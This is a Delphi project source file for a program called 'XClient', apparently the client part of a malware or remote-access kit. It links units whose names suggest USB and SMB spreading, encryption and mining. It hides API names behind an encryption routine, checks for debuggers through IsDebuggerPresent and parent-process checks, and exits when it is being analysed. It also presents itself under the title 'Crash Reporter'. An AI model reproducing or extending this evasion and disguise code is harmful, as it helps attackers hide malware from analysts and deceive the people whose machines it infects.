program XClient;

uses
  Forms,
  Windows,
  Psapi,
  tlhelp32,
  SysUtils,
  Main in 'Main.pas' {MainForm},
  uTypes in 'uTypes.pas',
  uFnc in 'uFnc.pas',
  uList in '..\Server\uList.pas',
  uSockets in '..\Server\uSockets.pas',
  uThread in '..\Server\uThread.pas',
  AtU in 'AtU.pas',
  Cli in 'Cli.pas',
  CliP in 'CliP.pas',
  FI in 'FI.pas',
  FIK in 'FIK.pas',
  FIE in 'FIE.pas',
  FIO in 'FIO.pas',
  uEnc in 'uEnc.pas',
  uRm in 'uRm.pas',
  uAI in 'uAI.pas',
  uTsk in 'uTsk.pas',
  uUsb in 'uUsb.pas',                      
  uDir in 'uDir.pas',
  uIcon in 'uIcon.pas',
  uWin in 'uWin.pas',
  uAnt in 'uAnt.pas',
  uCon in 'uCon.pas',
  Ming in 'Ming.pas',
  uInfo in 'uInfo.pas',
  uSmb in 'uSmb.pas',
  uEof in 'uEof.pas',
  PJResFile in '..\Server\PJResFile.pas';

{$R *.res}
{$R App.res}

var
  ADB : String;
type
  TDBG = function(): Boolean; stdcall;

function DGBD(): Boolean;
var
  FDBG: TDBG;
begin
  @FDBG := GetProcAddress(LoadLibrary(PChar(uEnc.DE('ixmer1dIvAgTkvvJ'))), PChar(uEnc.DE('A1+zro3AIUFmtUY1WE7W8KG')));
  Result := FDBG;
end; { DGBD -> IsDebuggerPresent Windows API }

function GPPF(): String;
const
  BufferSize = 4096;
var
  HSS: THandle;
  EPP: TProcessEntry32;
  CPId: DWORD;
  HPPr: THandle;
  PPId: DWORD;
  PPFo: Boolean;
  PPPh: string;
begin
  Result := '';
  PPFo := False;
  HSS := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // Enumerate the process
  if HSS <> INVALID_HANDLE_VALUE then begin
    EPP.dwSize := SizeOf(EPP);
    if Process32First(HSS, EPP) then begin // Find the first process
      CPId := GetCurrentProcessId(); // Get the id of the current process
      repeat
        if EPP.th32ProcessID = CPId then begin
          PPId := EPP.th32ParentProcessID; // Get the id of the parent process
          HPPr := OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, False, PPId);
          if HPPr <> 0 then begin
            PPFo := True;
            SetLength(PPPh, BufferSize);
            GetModuleFileNameEx(HPPr, 0, PChar(PPPh), BufferSize);
            PPPh := PChar(PPPh);
            CloseHandle(HPPr);
          end;
          break;
        end;
      until not Process32Next(HSS, EPP);
    end;
    CloseHandle(HSS);
  end;
  if PPFo then
    Result := PPPh;
end; { GetTheParentProcessFileName -> Anti Debugger Get Parent Process Name }

begin
  // Anti Debugger Protect
  ADB := LowerCase(ExtractFileName(GPPF));
  if ADB <> '' then
    if ((ADB <> DE('sFWQnyXbCjU2+QnE')) and (ADB <> DE('qFhH2HdxeC')) and (Ord(ADB[1]) <> 196) and (ADB <> LowerCase(DE('axeBdm6eRQ8P2FKQED')))) or DGBD then
    asm
      call ExitProcess
    end;                              

  // Initialize Application
  Application.Initialize;
  Application.Title := 'Crash Reporter';
  Application.CreateForm(TMainForm, MainForm);
  Application.Run;
end.

